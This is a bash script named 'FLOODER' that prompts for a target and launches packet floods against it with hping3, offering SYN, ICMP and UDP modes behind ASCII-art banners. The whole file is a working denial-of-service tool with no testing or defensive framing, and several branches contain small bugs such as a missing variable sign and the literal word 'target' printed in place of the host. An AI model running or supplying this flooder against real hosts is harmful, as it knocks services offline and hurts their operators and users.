#!/bin/bash

autoclear=on
autoverbose=on
target=$1

# ^^^ vars ^^^ #

if [[ $autoclear == "on" ]]; then
        clear
fi
if [[ -z $target ]]; then
        read -e -p "input target > " target
fi

# ^^^ autoclear ^^^

figlet "FLOODER"|lolcat -S 58

# ^^^ into ^^^ #

echo -e "select a mode"
echo -e "\n Modes vv \n\n        - for default mode\n   1 - icmp (not deadly)\n 2 - upd\n\n Modes ^^ \n\a"

read -e -p "$HOSTNAME ...> " mode

if [[ -z $mode ]]; then
        echo -e "How do u want your Packets?\n\n        S, syn - syn packets\n   - default\n\a"
        read -e -p "$HOSTNAME ...> " DMode
        if [[ -z $DMode ]]; then
                clear
                echo -n "FLOODING"|figlet|lolcat -s 55
                echo -e " $target\n"
                sudo hping3 -S --flood $target
        elif [[ $DMode == "S" || $DMode == "syn" ]]; then
                clear
                echo -n "FLOODING"|figlet|lolcat -s 55
                echo -e " $target\n"
                sudo hping3 -S --flood $target
        fi
elif [[ $mode == "1" || $mode == "icmp" ]]; then
        echo -e "How do u want your Packets?\n\n        S, syn - syn packets\n  A, ack - ack packets\n   - default\n\a"
        read -e -p "$HOSTNAME ...> " icmpmode
        if [[ -z icmpmode ]]; then
                clear
                echo -n "FLOODING"|figlet|lolcat -s 55
                echo -e " $target\n"
                sudo hping3 -1 --flood $target
        elif [[ $icmpmode == "S" || $icmpmode == "syn" ]]; then
                clear
                figlet "FLOODING"|lolcat -s 55
                echo -e " $target\n"
                sudo hping3 -1 -S $target
        elif [[ $icmpmode == "A" || $icmpmode == "ack" ]]; then
                clear
                figlet "FLOODING"|lolcat -s 55
                echo -e " target\n"
                sudo hping3 -1 -A --flood $target
        fi
elif [[ $mode == "2" || $mode == "upd" ]]; then
        echo -e "How do u want your Packets?\n\n S, syn - syn packets\n  A, ack - ack packets\n   - default\n\a"
        read -e -p "$HOSTNAME ...> " updmode
        if [[ -z $updmode ]]; then
                clear
                echo -n "FLOODING"|figlet|lolcat -s 55
                echo -e " target\n"
                sudo hping3 -2 -S --flood $target
        elif [[ $updmode == "S" || $updmode == "syn" ]]; then
                clear
                figlet "FLOODING"|lolcat -s 55
                echo -e " target\n"
                sudo hping3 -2 -S --flood $target
        elif [[ $updmode == "A" || $updmode == "ack" ]]; then
                clear
                figlet "FLOODING"|lolcat -s 55
                echo -e " target\n"
                sudo hping3 -2 -A --flood $target
        fi
fi

# updated version of flooder #
